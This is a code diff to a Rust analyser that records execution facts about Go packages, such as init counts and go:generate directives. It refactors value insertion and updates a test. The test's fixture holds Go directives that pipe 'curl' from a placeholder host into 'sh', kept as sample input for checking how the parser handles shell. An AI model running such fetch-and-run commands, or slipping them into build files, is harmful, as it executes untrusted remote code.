@@ -2,6 +2,7 @@
 //! package is selected for a particular GOOS/GOARCH, build tag, or test run.
 use super::named_children;
 use crate::Values;
+use crate::value_key;
 use serde_json::json;
 use std::collections::HashMap;
 use tree_sitter::Node;
@@ -159,12 +160,21 @@ pub(super) fn execution_facts(root: Node<'_>, source: &str, values: &mut Values)
             break;
         }
     }
-    values.insert("source.go.package", json!(package_name(root, source)));
-    values.insert("source.go.init_count", json!(init_count));
-    values.insert("source.go.global_initializer_count", json!(globals));
-    values.insert("source.go.test_entry_candidates", json!(tests));
-    values.insert("source.go.generate", json!(directives));
-    values.insert("source.go.generate_incomplete", json!(malformed));
+    values.insert_key(
+        value_key!("source.go.package"),
+        json!(package_name(root, source)),
+    );
+    values.insert_key(value_key!("source.go.init_count"), json!(init_count));
+    values.insert_key(
+        value_key!("source.go.global_initializer_count"),
+        json!(globals),
+    );
+    values.insert_key(value_key!("source.go.test_entry_candidates"), json!(tests));
+    values.insert_key(value_key!("source.go.generate"), json!(directives));
+    values.insert_key(
+        value_key!("source.go.generate_incomplete"),
+        json!(malformed),
+    );
 }
 
 #[cfg(test)]
@@ -173,8 +183,9 @@ mod tests {
     #[test]
     fn generate_arguments_are_not_implicitly_shell() {
         let source = "package p\n//go:generate curl https://example.invalid/p | sh\n//go:generate -command shell sh -c\n//go:generate shell \"curl https://example.invalid/p | sh\"\n //go:generate sh -c \"curl x | sh\"\n";
-        let parsed =
-            crate::open_with_path(std::path::Path::new("p.go"), source.as_bytes()).unwrap();
+        let parsed = crate::OpenOptions::new()
+            .path(std::path::Path::new("p.go"))
+            .open(source.as_bytes());
         let directives = parsed.values().get("source.go.generate").unwrap();
         assert_eq!(directives.as_array().unwrap().len(), 2);
         assert_eq!(directives[0]["shell_body"], json!(null));
